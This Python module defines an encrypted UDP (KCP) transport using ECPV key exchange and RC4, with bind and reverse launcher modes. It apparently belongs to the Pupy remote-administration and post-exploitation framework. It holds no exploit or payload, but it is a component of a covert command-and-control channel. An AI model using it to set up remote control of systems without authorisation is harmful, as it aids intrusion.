# -*- coding: utf-8 -*-
from network.transports import Transport, LAUNCHER_TYPE_BIND
from network.lib import PupyUDPServer, PupyUDPClient, PupyUDPSocketStream
from network.lib import EC4TransportClient, EC4TransportServer

class TransportConf(Transport):
    info = "UDP(KCP) + ECPV + RC4"
    name = "kc4"
    server = PupyUDPServer
    client = PupyUDPClient
    stream = PupyUDPSocketStream
    client_transport = EC4TransportClient
    server_transport = EC4TransportServer
    credentials = ['ECPV_RC4_PUBLIC_KEY', 'ECPV_RC4_PRIVATE_KEY']
    dgram = True

    def __init__(self, *args, **kwargs):
        Transport.__init__(self, *args, **kwargs)
        try:
            import pupy_credentials
            PUB_KEY = pupy_credentials.ECPV_RC4_PUBLIC_KEY
            PRIV_KEY = pupy_credentials.ECPV_RC4_PRIVATE_KEY

        except ImportError:
            from pupylib.PupyCredentials import Credentials
            credentials = Credentials()
            PUB_KEY = credentials['ECPV_RC4_PUBLIC_KEY']
            PRIV_KEY = credentials['ECPV_RC4_PRIVATE_KEY']

        if self.launcher_type == LAUNCHER_TYPE_BIND:
            self.client_transport = EC4TransportServer.custom(privkey=PRIV_KEY)
            self.server_transport = EC4TransportClient.custom(pubkey=PUB_KEY)

        else:
            self.server_transport = EC4TransportServer.custom(privkey=PRIV_KEY)
            self.client_transport = EC4TransportClient.custom(pubkey=PUB_KEY)
